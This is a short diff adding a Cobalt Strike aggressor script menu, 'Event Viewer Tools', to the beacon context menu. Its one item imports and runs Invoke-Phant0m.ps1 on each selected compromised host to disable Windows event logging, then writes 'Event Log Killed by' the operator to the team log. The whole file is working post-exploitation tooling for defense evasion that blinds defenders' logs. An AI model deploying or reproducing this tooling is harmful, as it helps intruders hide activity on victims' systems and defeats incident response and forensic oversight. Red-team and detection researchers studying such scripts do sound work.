@@ -1,0 +1,12 @@
+popup beacon_bottom {
+		menu "Event Viewer Tools" {
+			item "Disable Event Viewer"{
+				local('$bid');
+				foreach $bid ($1){
+					bpowershell_import($bid, script_resource("disableeventvwr/Invoke-Phant0m.ps1"));
+					bpowershell($bid, "Invoke-Phant0m");
+					elog("Event Log Killed by " . mynick() . " on " . binfo("$bid", "computer"));
+				}
+			}
+		}
+	}
